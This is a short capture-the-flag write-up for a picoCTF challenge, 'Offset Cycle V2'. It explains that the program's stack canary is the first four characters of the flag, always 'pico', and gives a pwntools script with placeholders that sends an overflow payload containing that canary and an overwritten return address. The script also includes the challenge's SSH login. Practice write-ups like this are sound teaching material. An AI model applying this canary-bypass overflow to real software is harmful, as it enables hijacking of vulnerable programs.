# Offset Cycle V2

## Solution
This is the same as offset cycle except with a shorter time limit and a canary. However the canary is merely the first 4 characters of the flag as seen in the source code.
```c
void load_canary() {
    FILE *f = fopen("CodeBank/flag.txt", "r");

    if (!f) {
        puts("Missing flag.txt.");
        exit(0);
    }

    fread(global_canary, 1, CANARY_SIZE, f);
    fclose(f);
}
```
So, the canary is constant and easily known, as the first 4 characters of the flag are always `pico` as defined in the flag format.
The rest of the solve is otherwise the same as offset cycle.

## Script

```py
from pwn import *

sh = ssh("ctf-player", "dolphin-cove.picoctf.net", 49263 , "1ad5be0d")

bin = "./XX"
padding_to_canary = ?
canary_length = 4
canary = b"pico"

p = sh.process(bin)
padding_after_canary = 0x10
dest = p32(0x08049316)
p.sendlineafter(b'bytes', str(padding_after_canary + padding_to_canary + 8))
p.sendlineafter(b'>', b'a'*padding_to_canary + canary + b'a'*padding_after_canary + dest)

p.interactive()
```
Note: replace `XX` and the `?` in `padding_to_canary` with the target executable and buffer size.